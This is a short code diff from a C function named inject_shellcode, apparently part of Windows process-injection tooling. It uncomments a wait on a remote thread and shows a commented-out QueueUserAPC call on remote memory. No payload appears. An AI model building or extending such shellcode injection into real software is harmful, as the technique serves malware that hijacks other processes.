@@ -60,7 +60,7 @@ BOOL inject_shellcode(HANDLE new_process_handle, const char *shellcode, size_t s
     
 
     // Wait for the remote thread to finish executing
-    //WaitForSingleObject(thread_handle, INFINITE);
+    WaitForSingleObject(thread_handle, INFINITE);
 
     /*
     BOOL result = QueueUserAPC((PAPCFUNC)remote_memory_address, thread_handle, (ULONG_PTR) NULL);
